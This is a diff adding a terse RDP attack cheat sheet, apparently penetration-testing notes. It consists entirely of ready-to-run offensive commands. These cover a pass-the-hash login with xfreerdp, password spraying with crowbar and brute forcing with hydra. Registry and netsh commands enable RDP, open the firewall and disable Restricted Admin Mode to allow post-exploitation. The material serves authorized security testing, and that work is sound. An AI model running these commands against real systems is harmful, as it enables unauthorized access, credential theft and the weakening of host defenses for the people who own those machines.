@@ -1,0 +1,23 @@
+RDP  | 3389 | 
+
+
+Login to RDP:
+•	Option 1: xfreerdp /v:10.10.10.100 /u:admin /p:password
+•	Option2: rdesktop -u admin -p password123 10.10.10.100
+•	Add a local directory as an SMB Share: xfreerdp /v:10.10.10.100 /u:admin /p:password +home-drive
+•	Pass the Hash login:
+1.	Disable Restricted Admin Mode: reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+2.	Perform PtH: xfreerdp /v:10.10.10.100 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA
+
+
+Finding Credentials:
+•	Password spraying against the RDP service: crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+•	Brute-forcing the RDP service: hydra -L usernames.txt -p 'password123' 10.10.10.100 rdp
+Enabling RDP (Requires local Administrator)
+If you have control over a local Administrator account, you can enable RDP and use xfreerdp to perform post-exploitation in better conditions
+To do so, follow these steps:
+1.	enable RDP: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+2.	enable RDP from the firewall config: netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+3.	disable the restricted admin mode: reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+
